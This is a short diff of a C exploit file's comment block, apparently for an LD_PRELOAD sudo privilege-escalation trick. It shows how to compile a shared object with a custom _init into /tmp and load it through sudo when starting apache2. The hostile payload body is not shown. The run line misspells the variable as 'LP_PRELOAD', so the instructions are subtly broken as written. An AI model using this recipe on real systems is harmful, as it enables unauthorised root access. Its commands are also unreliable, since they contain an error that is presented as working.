@@ -10,8 +10,8 @@ void _init ()
 
 /* 
 Complie 
-gcc -fPIC -shared -nostartfiles -o /tmp/preload.c ld_preload.c
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ld_preload.c
 
-Run with sudo
-sudo LP_PRELOAD=/tmp/preload.c 
+Run with sudo service 
+sudo LP_PRELOAD=/tmp/preload.so apache2
 */
